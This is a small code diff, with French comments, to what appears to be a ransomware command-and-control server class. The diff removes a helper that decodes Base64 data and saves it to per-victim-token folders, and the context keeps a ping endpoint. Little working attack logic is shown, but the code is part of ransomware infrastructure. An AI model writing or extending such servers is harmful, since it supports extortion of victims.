@@ -11,18 +11,6 @@ class CNC(CNCBase):
     ROOT_PATH = "/root/CNC"
     RANSOMWARE_PATH = "/root/dist"
 
-    def save_b64(self, token:str, data:str, filename:str):
-        # Fonction d'aide pour sauvegarder les données décodées depuis Base64
-        # Les paramètres token et data sont des chaînes Base64
-
-        # Décode les données en Base64
-        bin_data = base64.b64decode(data)
-        # Crée le chemin du fichier en fonction du token et du nom du fichier
-        path = os.path.join(CNC.ROOT_PATH, token, filename)
-        # Ouvre et écrit les données décodées dans le fichier
-        with open(path, "wb") as f:
-            f.write(bin_data)
-
     def get_ping(self, path: str, params: dict, body: dict) -> dict:
         # Fonction pour vérifier si le serveur est en ligne, renvoie un statut "OK"
         return {"status": "OK"}
